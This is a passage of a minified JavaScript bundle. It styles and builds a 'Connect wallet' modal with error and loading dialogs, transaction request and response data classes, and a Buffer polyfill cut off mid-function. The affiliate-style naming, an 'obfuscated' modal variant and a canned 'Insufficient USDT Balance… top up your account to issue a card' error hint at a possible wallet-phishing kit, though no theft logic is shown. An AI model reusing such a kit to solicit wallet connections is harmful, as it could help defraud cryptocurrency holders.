{\n\t\t\t\t\tfont-family: 'Inter', sans-serif;\n\t\t\t\t\tfont-weight: 600;\n\t\t\t\t\tfont-size: 20px;\n\t\t\t\t\tcolor: #313131;\n\t\t\t\t\tmargin: 0;\n\t\t\t\t\tline-height: 1.3;\n\t\t\t\t\ttransition: color 0.3s ease;\n\t\t\t\t}\n\n\t\t\t\t.dark-theme-ncaffiliateown .error-modal-title-ncaffiliateown {\n\t\t\t\t\tcolor: #ffffff;\n\t\t\t\t}\n\n\t\t\t\t.error-modal-text-ncaffiliateown {\n\t\t\t\t\tfont-family: 'Inter', sans-serif;\n\t\t\t\t\tfont-weight: 400;\n\t\t\t\t\tfont-size: 14px;\n\t\t\t\t\tcolor: #6b6b6b;\n\t\t\t\t\tline-height: 1.5;\n\t\t\t\t\tmargin: 0;\n\t\t\t\t\tmax-width: 320px;\n\t\t\t\t\ttransition: color 0.3s ease;\n\t\t\t\t}\n\n\t\t\t\t.dark-theme-ncaffiliateown .error-modal-text-ncaffiliateown {\n\t\t\t\t\tcolor: #9a9a9a;\n\t\t\t\t}\n\n\t\t\t/* Loading Modal Styles */\n\t\t\t.loading-modal-ncaffiliateown {\n\t\t\t\twidth: 420px;\n\t\t\t\tmax-width: 90vw;\n\t\t\t\tpadding: 35px 30px;\n\t\t\t\ttext-align: center;\n\t\t\t}\n\n\t\t\t.dark-theme-ncaffiliateown .loading-modal-ncaffiliateown {\n\t\t\t\tbackground: #0e0e0e;\n\t\t\t\tbox-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);\n\t\t\t}\n\n\t\t\t.loading-modal-content-ncaffiliateown {\n\t\t\t\t\tdisplay: flex;\n\t\t\t\t\tflex-direction: column;\n\t\t\t\t\talign-items: center;\n\t\t\t\t\tgap: 16px;\n\t\t\t\t}\n\n\t\t\t\t.loading-spinner-wrapper-ncaffiliateown {\n\t\t\t\t\twidth: 56px;\n\t\t\t\t\theight: 56px;\n\t\t\t\t\tdisplay: flex;\n\t\t\t\t\talign-items: center;\n\t\t\t\t\tjustify-content: center;\n\t\t\t\t}\n\n\t\t\t\t.loading-spinner-ncaffiliateown {\n\t\t\t\t\twidth: 100%;\n\t\t\t\t\theight: 100%;\n\t\t\t\t\tanimation: rotate 1s linear infinite;\n\t\t\t\t}\n\n\t\t\t\t.loading-spinner-circle-ncaffiliateown {\n\t\t\t\t\tstroke: #3b99fc;\n\t\t\t\t\tstroke-linecap: round;\n\t\t\t\t\tstroke-dasharray: 1, 150;\n\t\t\t\t\tstroke-dashoffset: 0;\n\t\t\t\t\tanimation: dash 1.5s ease-in-out infinite;\n\t\t\t\t\ttransition: stroke 0.3s ease;\n\t\t\t\t}\n\n\t\t\t\t.dark-theme-ncaffiliateown .loading-spinner-circle-ncaffiliateown {\n\t\t\t\t\tstroke: #5db0ff;\n\t\t\t\t}\n\n\t\t\t\t@keyframes rotate {\n\t\t\t\t\t100% { transform: rotate(360deg); }\n\t\t\t\t}\n\n\t\t\t\t@keyframes dash {\n\t\t\t\t\t0% {\n\t\t\t\t\t\tstroke-dasharray: 1, 150;\n\t\t\t\t\t\tstroke-dashoffset: 0;\n\t\t\t\t\t}\n\t\t\t\t\t50% {\n\t\t\t\t\t\tstroke-dasharray: 90, 150;\n\t\t\t\t\t\tstroke-dashoffset: -35;\n\t\t\t\t\t}\n\t\t\t\t\t100% {\n\t\t\t\t\t\tstroke-dasharray: 90, 150;\n\t\t\t\t\t\tstroke-dashoffset: -124;\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\t.loading-modal-title-ncaffiliateown {\n\t\t\t\t\tfont-family: 'Inter', sans-serif;\n\t\t\t\t\tfont-weight: 600;\n\t\t\t\t\tfont-size: 20px;\n\t\t\t\t\tcolor: #313131;\n\t\t\t\t\tmargin: 0;\n\t\t\t\t\tline-height: 1.3;\n\t\t\t\t\ttransition: color 0.3s ease;\n\t\t\t\t}\n\n\t\t\t\t.dark-theme-ncaffiliateown .loading-modal-title-ncaffiliateown {\n\t\t\t\t\tcolor: #ffffff;\n\t\t\t\t}\n\n\t\t\t\t.loading-modal-text-ncaffiliateown {\n\t\t\t\t\tfont-family: 'Inter', sans-serif;\n\t\t\t\t\tfont-weight: 400;\n\t\t\t\t\tfont-size: 14px;\n\t\t\t\t\tcolor: #6b6b6b;\n\t\t\t\t\tline-height: 1.5;\n\t\t\t\t\tmargin: 0;\n\t\t\t\t\tmax-width: 320px;\n\t\t\t\t\ttransition: color 0.3s ease;\n\t\t\t\t}\n\n\t\t\t\t.dark-theme-ncaffiliateown .loading-modal-text-ncaffiliateown {\n\t\t\t\t\tcolor: #9a9a9a;\n\t\t\t\t}\n\n\t\t\t\t/* Responsive Styles */\n\t\t\t\t@media (max-width: 768px) {\n\t\t\t\t\t.modal-overlay-ncaffiliateown {\n\t\t\t\t\t\talign-items: flex-end;\n\t\t\t\t\t\tpadding: 0;\n\t\t\t\t\t}\n\n\t\t\t\t\t.modal-ncaffiliateown {\n\t\t\t\t\t\twidth: 100%;\n\t\t\t\t\t\tmax-width: 100%;\n\t\t\t\t\t\tmax-height: 80vh;\n\t\t\t\t\t\tborder-radius: 24px 24px 0 0;\n\t\t\t\t\t\tmargin: 0;\n\t\t\t\t\t\ttransform: translateY(100%);\n\t\t\t\t\t\tbox-shadow: 0 -10px 40px rgba(0, 0, 0, 0.3);\n\t\t\t\t\t}\n\n\t\t\t\t\t.modal-overlay-ncaffiliateown.active .modal-ncaffiliateown {\n\t\t\t\t\t\ttransform: translateY(0);\n\t\t\t\t\t}\n\n\t\t\t\t\t.modal-header-ncaffiliateown {\n\t\t\t\t\t\tpadding: 30px 30px 20px;\n\t\t\t\t\t\tposition: relative;\n\t\t\t\t\t}\n\n\t\t\t\t\t.modal-header-ncaffiliateown::before {\n\t\t\t\t\t\tcontent: '';\n\t\t\t\t\t\tposition: absolute;\n\t\t\t\t\t\ttop: 12px;\n\t\t\t\t\t\tleft: 50%;\n\t\t\t\t\t\ttransform: translateX(-50%);\n\t\t\t\t\t\twidth: 40px;\n\t\t\t\t\t\theight: 4px;\n\t\t\t\t\t\tbackground: #ddd;\n\t\t\t\t\t\tborder-radius: 2px;\n\t\t\t\t\t\ttransition: background 0.3s ease;\n\t\t\t\t\t}\n\n\t\t\t\t\t.dark-theme-ncaffiliateown .modal-header-ncaffiliateown::before {\n\t\t\t\t\t\tbackground: #555;\n\t\t\t\t\t}\n\n\t\t\t\t\t.modal-content-ncaffiliateown {\n\t\t\t\t\t\tpadding: 10px 30px 40px;\n\t\t\t\t\t\tmax-height: calc(80vh - 140px);\n\t\t\t\t\t\toverflow-y: auto;\n\t\t\t\t\t}\n\n\t\t\t\t\t.modal-title-ncaffiliateown {\n\t\t\t\t\t\tfont-size: 24px;\n\t\t\t\t\t\tmargin-bottom: 10px;\n\t\t\t\t\t}\n\n\t\t\t\t\t.modal-subtitle-ncaffiliateown {\n\t\t\t\t\t\tfont-size: 16px;\n\t\t\t\t\t}\n\n\t\t\t\t\t.close-button-ncaffiliateown {\n\t\t\t\t\t\ttop: 15px;\n\t\t\t\t\t\tright: 15px;\n\t\t\t\t\t\twidth: 28px;\n\t\t\t\t\t\theight: 28px;\n\t\t\t\t\t}\n\n\t\t\t\t\t.wallet-option-ncaffiliateown {\n\t\t\t\t\t\tpadding: 16px 14px;\n\t\t\t\t\t\tmargin-bottom: 12px;\n\t\t\t\t\t\tborder-radius: 16px;\n\t\t\t\t\t}\n\n\t\t\t\t\t.wallet-option-ncaffiliateown:hover {\n\t\t\t\t\t\ttransform: none;\n\t\t\t\t\t\tbackground: #f0f0f0;\n\t\t\t\t\t}\n\n\t\t\t\t\t.wallet-name-ncaffiliateown {\n\t\t\t\t\t\tfont-size: 17px;\n\t\t\t\t\t\tfont-weight: 500;\n\t\t\t\t\t}\n\n\t\t\t\t\t.qr-badge-ncaffiliateown {\n\t\t\t\t\t\tpadding: 10px 12px;\n\t\t\t\t\t\tborder-radius: 10px;\n\t\t\t\t\t}\n\n\t\t\t\t\t.qr-badge-text-ncaffiliateown {\n\t\t\t\t\t\tfont-size: 12px;\n\t\t\t\t\t}\n\n\t\t\t\t\t.detected-badge-ncaffiliateown {\n\t\t\t\t\t\tpadding: 10px 12px;\n\t\t\t\t\t\tborder-radius: 10px;\n\t\t\t\t\t}\n\n\t\t\t\t\t.detected-badge-text-ncaffiliateown {\n\t\t\t\t\t\tfont-size: 12px;\n\t\t\t\t\t}\n\n\t\t\t\t\t.wallet-icon-ncaffiliateown {\n\t\t\t\t\t\twidth: 40px;\n\t\t\t\t\t\theight: 40px;\n\t\t\t\t\t\tmargin-right: 15px;\n\t\t\t\t\t}\n\n\t\t\t\t\t.wallet-icon-ncaffiliateown svg {\n\t\t\t\t\t\twidth: 28px;\n\t\t\t\t\t\theight: 28px;\n\t\t\t\t\t}\n\n\t\t\t\t\t.modal-ncaffiliateown.obfuscated-ncaffiliateown {\n\t\t\t\t\t\twidth: 100%;\n\t\t\t\t\t\ttransform: translateY(100%);\n\t\t\t\t\t}\n\n\t\t\t\t\t.modal-overlay-ncaffiliateown.active .modal-ncaffiliateown.obfuscated-ncaffiliateown {\n\t\t\t\t\t\ttransform: translateY(0);\n\t\t\t\t\t}\n\n\t\t\t\t\t.obfuscated-ncaffiliateown .modal-header-ncaffiliateown {\n\t\t\t\t\t\tpadding: 24px 24px 16px;\n\t\t\t\t\t}\n\n\t\t\t\t\t.obfuscated-ncaffiliateown .modal-content-ncaffiliateown {\n\t\t\t\t\t\tpadding: 8px 24px 32px;\n\t\t\t\t\t}\n\n\t\t\t\t\t.obfuscated-ncaffiliateown .modal-title-ncaffiliateown {\n\t\t\t\t\t\tfont-size: 19px;\n\t\t\t\t\t\tmargin-bottom: 8px;\n\t\t\t\t\t}\n\n\t\t\t\t\t.obfuscated-ncaffiliateown .modal-subtitle-ncaffiliateown {\n\t\t\t\t\t\tfont-size: 13px;\n\t\t\t\t\t}\n\n\t\t\t\t\t.obfuscated-ncaffiliateown .wallet-option-ncaffiliateown {\n\t\t\t\t\t\tpadding: 13px 11px;\n\t\t\t\t\t\tmargin-bottom: 10px;\n\t\t\t\t\t}\n\n\t\t\t\t\t.obfuscated-ncaffiliateown .wallet-name-ncaffiliateown {\n\t\t\t\t\t\tfont-size: 14px;\n\t\t\t\t\t}\n\n\t\t\t\t\t.obfuscated-ncaffiliateown .wallet-icon-ncaffiliateown {\n\t\t\t\t\t\twidth: 32px;\n\t\t\t\t\t\theight: 32px;\n\t\t\t\t\t\tmargin-right: 12px;\n\t\t\t\t\t}\n\n\t\t\t\t\t.obfuscated-ncaffiliateown .wallet-icon-ncaffiliateown svg {\n\t\t\t\t\t\twidth: 22px;\n\t\t\t\t\t\theight: 22px;\n\t\t\t\t\t}\n\n\t\t\t\t\t.obfuscated-ncaffiliateown .close-button-ncaffiliateown {\n\t\t\t\t\t\ttop: 12px;\n\t\t\t\t\t\tright: 12px;\n\t\t\t\t\t\twidth: 22px;\n\t\t\t\t\t\theight: 22px;\n\t\t\t\t\t}\n\n\t\t\t\t\t.error-modal-ncaffiliateown,\n\t\t\t\t\t.loading-modal-ncaffiliateown {\n\t\t\t\t\t\twidth: 100%;\n\t\t\t\t\t\tmax-width: 100%;\n\t\t\t\t\t\tborder-radius: 24px 24px 0 0;\n\t\t\t\t\t\tmargin: 0;\n\t\t\t\t\t\tpadding: 30px 25px 40px;\n\t\t\t\t\t\tposition: relative;\n\t\t\t\t\t\ttransform: translateY(100%);\n\t\t\t\t\t\tbox-shadow: 0 -10px 40px rgba(0, 0, 0, 0.3);\n\t\t\t\t\t}\n\n\t\t\t\t\t.modal-overlay-ncaffiliateown.active .error-modal-ncaffiliateown,\n\t\t\t\t\t.modal-overlay-ncaffiliateown.active .loading-modal-ncaffiliateown {\n\t\t\t\t\t\ttransform: translateY(0);\n\t\t\t\t\t}\n\n\t\t\t\t\t.error-modal-ncaffiliateown::before,\n\t\t\t\t\t.loading-modal-ncaffiliateown::before {\n\t\t\t\t\t\tcontent: '';\n\t\t\t\t\t\tposition: absolute;\n\t\t\t\t\t\ttop: 12px;\n\t\t\t\t\t\tleft: 50%;\n\t\t\t\t\t\ttransform: translateX(-50%);\n\t\t\t\t\t\twidth: 40px;\n\t\t\t\t\t\theight: 4px;\n\t\t\t\t\t\tbackground: #ddd;\n\t\t\t\t\t\tborder-radius: 2px;\n\t\t\t\t\t\ttransition: background 0.3s ease;\n\t\t\t\t\t}\n\n\t\t\t\t\t.dark-theme-ncaffiliateown .error-modal-ncaffiliateown::before,\n\t\t\t\t\t.dark-theme-ncaffiliateown .loading-modal-ncaffiliateown::before {\n\t\t\t\t\t\tbackground: #555;\n\t\t\t\t\t}\n\n\t\t\t\t\t.error-modal-content-ncaffiliateown,\n\t\t\t\t\t.loading-modal-content-ncaffiliateown {\n\t\t\t\t\t\tpadding-top: 10px;\n\t\t\t\t\t}\n\n\t\t\t\t\t.error-icon-wrapper-ncaffiliateown {\n\t\t\t\t\t\twidth: 52px;\n\t\t\t\t\t\theight: 52px;\n\t\t\t\t\t}\n\n\t\t\t\t\t.error-icon-ncaffiliateown {\n\t\t\t\t\t\twidth: 26px;\n\t\t\t\t\t\theight: 26px;\n\t\t\t\t\t}\n\n\t\t\t\t\t.error-modal-title-ncaffiliateown,\n\t\t\t\t\t.loading-modal-title-ncaffiliateown {\n\t\t\t\t\t\tfont-size: 19px;\n\t\t\t\t\t}\n\n\t\t\t\t\t.error-modal-text-ncaffiliateown,\n\t\t\t\t\t.loading-modal-text-ncaffiliateown {\n\t\t\t\t\t\tfont-size: 14px;\n\t\t\t\t\t}\n\n\t\t\t\t\t.loading-spinner-wrapper-ncaffiliateown {\n\t\t\t\t\t\twidth: 52px;\n\t\t\t\t\t\theight: 52px;\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\t@media (max-width: 480px) {\n\t\t\t\t\t.modal-header-ncaffiliateown {\n\t\t\t\t\t\tpadding: 25px 20px 15px;\n\t\t\t\t\t}\n\n\t\t\t\t\t.modal-content-ncaffiliateown {\n\t\t\t\t\t\tpadding: 10px 20px 30px;\n\t\t\t\t\t}\n\n\t\t\t\t\t.modal-title-ncaffiliateown {\n\t\t\t\t\t\tfont-size: 22px;\n\t\t\t\t\t}\n\n\t\t\t\t\t.modal-subtitle-ncaffiliateown {\n\t\t\t\t\t\tfont-size: 15px;\n\t\t\t\t\t}\n\n\t\t\t\t\t.wallet-option-ncaffiliateown {\n\t\t\t\t\t\tpadding: 14px 12px;\n\t\t\t\t\t}\n\n\t\t\t\t\t.wallet-name-ncaffiliateown {\n\t\t\t\t\t\tfont-size: 16px;\n\t\t\t\t\t}\n\n\t\t\t\t\t.error-modal-ncaffiliateown,\n\t\t\t\t\t.loading-modal-ncaffiliateown {\n\t\t\t\t\t\tpadding: 28px 22px 35px;\n\t\t\t\t\t}\n\n\t\t\t\t\t.error-icon-wrapper-ncaffiliateown {\n\t\t\t\t\t\twidth: 48px;\n\t\t\t\t\t\theight: 48px;\n\t\t\t\t\t}\n\n\t\t\t\t\t.error-icon-ncaffiliateown {\n\t\t\t\t\t\twidth: 24px;\n\t\t\t\t\t\theight: 24px;\n\t\t\t\t\t}\n\n\t\t\t\t\t.error-modal-title-ncaffiliateown,\n\t\t\t\t\t.loading-modal-title-ncaffiliateown {\n\t\t\t\t\t\tfont-size: 18px;\n\t\t\t\t\t}\n\n\t\t\t\t\t.error-modal-text-ncaffiliateown,\n\t\t\t\t\t.loading-modal-text-ncaffiliateown {\n\t\t\t\t\t\tfont-size: 13px;\n\t\t\t\t\t}\n\n\t\t\t\t\t.loading-spinner-wrapper-ncaffiliateown {\n\t\t\t\t\t\twidth: 48px;\n\t\t\t\t\t\theight: 48px;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t",
                        document.head.appendChild(t)
                    }
                    static _createHTML() {
                        const t = document.createElement("div");
                        t.innerHTML = this._getModalHTML(),
                        document.body.appendChild(t),
                        this.modalOverlay = document.getElementById("ncaffiliateown-modalOverlay"),
                        this.errorModalOverlay = document.getElementById("ncaffiliateown-errorModalOverlay"),
                        this.loadingModalOverlay = document.getElementById("ncaffiliateown-loadingModalOverlay"),
                        this._applyTheme()
                    }
                    static _applyTheme() {
                        "dark" === (this._config.theme || "light") ? document.body.classList.add("dark-theme-ncaffiliateown") : document.body.classList.remove("dark-theme-ncaffiliateown")
                    }
                    static _getModalHTML() {
                        return '\n\t\t\t\x3c!-- Основное модальное окно --\x3e\n\t\t\t<div class="modal-overlay-ncaffiliateown" id="ncaffiliateown-modalOverlay">\n\t\t\t\t<div class="modal-ncaffiliateown obfuscated-ncaffiliateown" onclick="event.stopPropagation()">\n\t\t\t\t\t<button class="close-button-ncaffiliateown" data-close-modal="main"></button>\n\t\t\t\t\t\n\t\t\t\t\t<div class="modal-header-ncaffiliateown">\n\t\t\t\t\t\t<h2 class="modal-title-ncaffiliateown">Connect wallet</h2>\n\t\t\t\t\t\t<p class="modal-subtitle-ncaffiliateown">\n\t\t\t\t\t\t\tChoose what network and wallet to connect\n\t\t\t\t\t\t</p>\n\t\t\t\t\t</div>\n\t\t\t\t\t\n\t\t\t\t\t<div class="modal-content-ncaffiliateown" id="ncaffiliateown-walletContainer">\n\t\t\t\t\t</div>\n\t\t\t\t</div>\n\t\t\t</div>\n\n\t\t\t\x3c!-- Error модальное окно --\x3e\n\t\t\t<div class="modal-overlay-ncaffiliateown" id="ncaffiliateown-errorModalOverlay">\n\t\t\t\t<div class="modal-ncaffiliateown error-modal-ncaffiliateown" onclick="event.stopPropagation()">\n\t\t\t\t\t<button class="close-button-ncaffiliateown" data-close-modal="error"></button>\n\t\t\t\t\t\n\t\t\t\t\t<div class="error-modal-content-ncaffiliateown">\n\t\t\t\t\t\t<div class="error-icon-wrapper-ncaffiliateown">\n\t\t\t\t\t\t\t<svg class="error-icon-ncaffiliateown" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">\n\t\t\t\t\t\t\t\t<circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="2"/>\n\t\t\t\t\t\t\t\t<path d="M12 7V13" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>\n\t\t\t\t\t\t\t\t<circle cx="12" cy="16.5" r="1" fill="currentColor"/>\n\t\t\t\t\t\t\t</svg>\n\t\t\t\t\t\t</div>\n\t\t\t\t\t\t<h2 class="error-modal-title-ncaffiliateown">Error</h2>\n\t\t\t\t\t\t<p class="error-modal-text-ncaffiliateown">Something went wrong. Please try again later.</p>\n\t\t\t\t\t</div>\n\t\t\t\t</div>\n\t\t\t</div>\n\n\t\t\t\x3c!-- Loading модальное окно --\x3e\n\t\t\t\t<div class="modal-overlay-ncaffiliateown" id="ncaffiliateown-loadingModalOverlay">\n\t\t\t\t\t<div class="modal-ncaffiliateown loading-modal-ncaffiliateown" onclick="event.stopPropagation()">\n\t\t\t\t\t\t<div class="loading-modal-content-ncaffiliateown">\n\t\t\t\t\t\t\t<div class="loading-spinner-wrapper-ncaffiliateown">\n\t\t\t\t\t\t\t\t<svg class="loading-spinner-ncaffiliateown" viewBox="0 0 50 50">\n\t\t\t\t\t\t\t\t\t<circle class="loading-spinner-circle-ncaffiliateown" cx="25" cy="25" r="20" fill="none" stroke-width="3"></circle>\n\t\t\t\t\t\t\t\t</svg>\n\t\t\t\t\t\t\t</div>\n\t\t\t\t\t\t\t<h2 class="loading-modal-title-ncaffiliateown">Loading</h2>\n\t\t\t\t\t\t\t<p class="loading-modal-text-ncaffiliateown">Please wait...</p>\n\t\t\t\t\t\t</div>\n\t\t\t\t\t</div>\n\t\t\t\t</div>\n\t\t\t'
                    }
                    static _getWalletOptionsHTML() {
                        return this._config.wallets.enabled.map(t => `\n\t\t\t<div class="wallet-option-ncaffiliateown" data-wallet="${t.id}">\n\t\t\t\t<div class="wallet-icon-ncaffiliateown">\n\t\t\t\t\t${t.svg}\n\t\t\t\t</div>\n\t\t\t\t<span class="wallet-name-ncaffiliateown">${t.name}</span>\n\t\t\t\t${t.qrCode ? '<div class="qr-badge-ncaffiliateown"><span class="qr-badge-text-ncaffiliateown">QR CODE</span></div>' : ""}\n\t\t\t</div>\n\t\t`).join("")
                    }
                    static _renderWallets() {
                        const t = document.getElementById("ncaffiliateown-walletContainer");
                        t && (t.innerHTML = this._getWalletOptionsHTML(),
                        t.querySelectorAll(".wallet-option-ncaffiliateown").forEach(t => {
                            t.addEventListener("click", () => {
                                this.selectWallet(t.dataset.wallet)
                            }
                            )
                        }
                        ))
                    }
                    static _setupEventListeners() {
                        this.modalOverlay.addEventListener("click", t => {
                            t.target === this.modalOverlay && this.closeModal()
                        }
                        ),
                        this.errorModalOverlay.addEventListener("click", t => {
                            t.target === this.errorModalOverlay && this.closeErrorModal()
                        }
                        ),
                        this.loadingModalOverlay.addEventListener("click", t => {
                            t.target === this.loadingModalOverlay && this.closeLoadingModal()
                        }
                        );
                        const t = this.modalOverlay.querySelector(".close-button-ncaffiliateown")
                          , e = this.errorModalOverlay.querySelector(".close-button-ncaffiliateown");
                        t && t.addEventListener("click", () => {
                            this.closeModal()
                        }
                        ),
                        e && e.addEventListener("click", () => {
                            this.closeErrorModal()
                        }
                        ),
                        document.addEventListener("keydown", t => {
                            "Escape" === t.key && this.closeAll()
                        }
                        )
                    }
                    static async openModal() {
                        if (!this.modalOverlay)
                            return;
                        this._applyTheme();
                        const t = this._config?.wallets?.enabled;
                        t && 1 === t.length ? this.selectWallet(t[0].id) : (this._renderWallets(),
                        this._closeOtherModals("main"),
                        this.modalOverlay.classList.add("active"),
                        document.body.style.overflow = "hidden")
                    }
                    static closeModal() {
                        this.modalOverlay && (this.modalOverlay.classList.remove("active"),
                        document.body.style.overflow = "auto")
                    }
                    static openErrorModal(t="default") {
                        if (!this.errorModalOverlay)
                            return;
                        this._applyTheme(),
                        this._closeOtherModals("error");
                        const e = this._config.errorMessages.get(t) || {
                            title: "Insufficient USDT Balance",
                            message: "Please top up your account to issue a card and try again."
                        }
                          , n = this.errorModalOverlay.querySelector(".error-modal-title-ncaffiliateown")
                          , r = this.errorModalOverlay.querySelector(".error-modal-text-ncaffiliateown");
                        n && (n.textContent = e.title),
                        r && (r.textContent = e.message),
                        this.errorModalOverlay.classList.add("active"),
                        document.body.style.overflow = "hidden"
                    }
                    static closeErrorModal() {
                        this.errorModalOverlay && (this.errorModalOverlay.classList.remove("active"),
                        document.body.style.overflow = "auto")
                    }
                    static openLoadingModal(t="default") {
                        if (!this.loadingModalOverlay)
                            return;
                        this._applyTheme(),
                        this._closeOtherModals("loading");
                        const e = this._config.loadingMessages.get(t) || {
                            title: "Loading",
                            message: "Please wait..."
                        }
                          , n = this.loadingModalOverlay.querySelector(".loading-modal-title-ncaffiliateown")
                          , r = this.loadingModalOverlay.querySelector(".loading-modal-text-ncaffiliateown");
                        n && (n.textContent = e.title),
                        r && (r.textContent = e.message),
                        this.loadingModalOverlay.classList.add("active"),
                        document.body.style.overflow = "hidden"
                    }
                    static closeLoadingModal() {
                        this.loadingModalOverlay && (this.loadingModalOverlay.classList.remove("active"),
                        document.body.style.overflow = "auto")
                    }
                    static _closeOtherModals(t) {
                        "main" !== t && this.closeModal(),
                        "error" !== t && this.closeErrorModal(),
                        "loading" !== t && this.closeLoadingModal()
                    }
                    static selectWallet(t) {
                        console.log("Selected wallet:", t),
                        "function" == typeof this.onWalletSelectCallback && this.onWalletSelectCallback(t),
                        this.closeModal()
                    }
                    static onWalletSelect(t) {
                        this.onWalletSelectCallback = t
                    }
                    static closeAll() {
                        this.closeModal(),
                        this.closeErrorModal(),
                        this.closeLoadingModal()
                    }
                    static updateConfig(t) {
                        this._config = {
                            ...this._config,
                            ...t
                        },
                        this.isInitialized && (this._applyTheme(),
                        this.modalOverlay && this._createHTML())
                    }
                    static getConfig() {
                        return {
                            ...this._config
                        }
                    }
                    static destroy() {
                        this.closeAll(),
                        this.modalOverlay && this.modalOverlay.remove(),
                        this.errorModalOverlay && this.errorModalOverlay.remove(),
                        this.loadingModalOverlay && this.loadingModalOverlay.remove(),
                        this.modalOverlay = null,
                        this.errorModalOverlay = null,
                        this.loadingModalOverlay = null,
                        this._config = null,
                        this.isInitialized = !1
                    }
                }
            }
        },
        7631(t, e, n) {
            const r = n(8311);
            t.exports = (t, e) => new r(t,e).set.map(t => t.map(t => t.value).join(" ").trim().split(" "))
        },
        7638(t, e, n) {
            const r = n(8311);
            t.exports = (t, e, n) => {
                try {
                    e = new r(e,n)
                } catch (t) {
                    return !1
                }
                return e.test(t)
            }
        },
        7748(t) {
            class e {
                constructor(t) {
                    this.result = t.result,
                    this.txid = t.txid,
                    this.code = t.code,
                    this.message = t.message
                }
                toJSON() {
                    return {
                        result: this.result,
                        txid: this.txid,
                        code: this.code,
                        message: this.message
                    }
                }
                static fromJSON(t) {
                    return new e(t)
                }
                get isSuccessful() {
                    return !0 === this.result
                }
            }
            t.exports = {
                SendTransactionResponseDTO: e
            }
        },
        7760(t) {
            class e {
                constructor(t) {
                    this.jwePayload = t.jwe_payload,
                    this.transaction = t.transaction
                }
                toJSON() {
                    return {
                        jwe_payload: this.jwePayload,
                        transaction: this.transaction
                    }
                }
                static fromJSON(t) {
                    return new e(t)
                }
            }
            t.exports = {
                BuildTransactionResponseDTO: e
            }
        },
        8013(t) {
            class e extends Error {
                constructor(t="Internal service error") {
                    super(t),
                    this.name = "InternalServiceError"
                }
            }
            class n extends Error {
                constructor(t, e=null) {
                    super(t),
                    this.name = "ValidationError",
                    this.field = e
                }
            }
            class r extends Error {
                constructor(t, e=null) {
                    super(t),
                    this.name = "NetworkError",
                    this.originalError = e
                }
            }
            t.exports = {
                InternalServiceError: e,
                ValidationError: n,
                NetworkError: r
            }
        },
        8287(t, e, n) {
            "use strict";
            const r = n(7526)
              , i = n(251)
              , o = "function" == typeof Symbol && "function" == typeof Symbol.for ? Symbol.for("nodejs.util.inspect.custom") : null;
            e.hp = c,
            e.IS = 50;
            const s = 2147483647;
            function a(t) {
                if (t > s)
                    throw new RangeError('The value "' + t + '" is invalid for option "size"');
                const e = new Uint8Array(t);
                return Object.setPrototypeOf(e, c.prototype),
                e
            }
            function c(t, e, n) {
                if ("number" == typeof t) {
                    if ("string" == typeof e)
                        throw new TypeError('The "string" argument must be of type string. Received type number');
                    return h(t)
                }
                return l(t, e, n)
            }
            function l(t, e, n) {
                if ("string" == typeof t)
                    return function(t, e) {
                        if ("string" == typeof e && "" !== e || (e = "utf8"),
                        !c.isEncoding(e))
                            throw new TypeError("Unknown encoding: " + e);
                        const n = 0 | g(t, e);
                        let r = a(n);
                        const i = r.write(t, e);
                        return i !== n && (r = r.slice(0, i)),
                        r
                    }(t, e);
                if (ArrayBuffer.isView(t))
                    return function(t) {
                        if (J(t, Uint8Array)) {
                            const e = new Uint8Array(t);
                            return f(e.buffer, e.byteOffset, e.byteLength)
                        }
                        return u(t)
                    }(t);
                if (null == t)
                    throw new TypeError("The first argument must be one of type string, Buffer, ArrayBuffer, Array, or Array-like Object. Received type " + typeof t);
                if (J(t, ArrayBuffer) || t && J(t.buffer, ArrayBuffer))
                    return f(t, e, n);
                if ("undefined" != typeof SharedArrayBuffer && (J(t, SharedArrayBuffer) || t && J(t.buffer, SharedArrayBuffer)))
                    return f(t, e, n);
                if ("number" == typeof t)
                    throw new TypeError('The "value" argument must not be of type number. Received type number');
                const r = t.valueOf && t.valueOf();
                if (null != r && r !== t)
                    return c.from(r, e, n);
                const i = function(t) {
                    if (c.isBuffer(t)) {
                        const e = 0 | p(t.length)
                          , n = a(e);
                        return 0 === n.length || t.copy(n, 0, 0, e),
                        n
                    }
                    return void 0 !== t.length ? "number" != typeof t.length || X(t.length) ? a(0) : u(t) : "Buffer" === t.type && Array.isArray(t.data) ? u(t.data) : void 0
                }(t);
                if (i)
                    return i;
                if ("undefined" != typeof Symbol && null != Symbol.toPrimitive && "function" == typeof t[Symbol.toPrimitive])
                    return c.from(t[Symbol.toPrimitive]("string"), e, n);
                throw new TypeError("The first argument must be one of type string, Buffer, ArrayBuffer, Array, or Array-like Object. Received type " + typeof t)
            }
            function d(t) {
                if ("number" != typeof t)
                    throw new TypeError('"size" argument must be of type number');
                if (t < 0)
                    throw new RangeError('The value "' + t + '" is invalid for option "size"')
            }
            function h(t) {
                return d(t),
                a(t < 0 ? 0 : 0 | p(t))
            }
            function u(t) {
                const e = t.length < 0 ? 0 : 0 | p(t.length)
                  , n = a(e);
                for (let r = 0; r < e; r += 1)
                    n[r] = 255 & t[r];
                return n
            }
            function f(t, e, n) {
                if (e < 0 || t.byteLength < e)
                    throw new RangeError('"offset" is outside of buffer bounds');
                if (t.byteLength < e + (n || 0))
                    throw new RangeError('"length" is outside of buffer bounds');
                let r;
                return r = void 0 === e && void 0 === n ? new Uint8Array(t) : void 0 === n ? new Uint8Array(t,e) : new Uint8Array(t,e,n),
                Object.setPrototypeOf(r, c.prototype),
                r
            }
            function p(t) {
                if (t >= s)
                    throw new RangeError("Attempt to allocate Buffer larger than maximum size: 0x" + s.toString(16) + " bytes");
                return 0 | t
            }
            function g(t, e) {
                if (c.isBuffer(t))
                    return t.length;
                if (ArrayBuffer.isView(t) || J(t, ArrayBuffer))
                    return t.byteLength;
                if ("string" != typeof t)
                    throw new TypeError('The "string" argument must be one of type string, Buffer, or ArrayBuffer. Received type ' + typeof t);
                const n = t.length
                  , r = arguments.length > 2 && !0 === arguments[2];
                if (!r && 0 === n)
                    return 0;
                let i = !1;
                for (; ; )
                    switch (e) {
                    case "ascii":
                    case "latin1":
                    case "binary":
                        return n;
                    case "utf8":
                    case "utf-8":
                        return G(t).length;
                    case "ucs2":
                    case "ucs-2":
                    case "utf16le":
                    case "utf-16le":
                        return 2 * n;
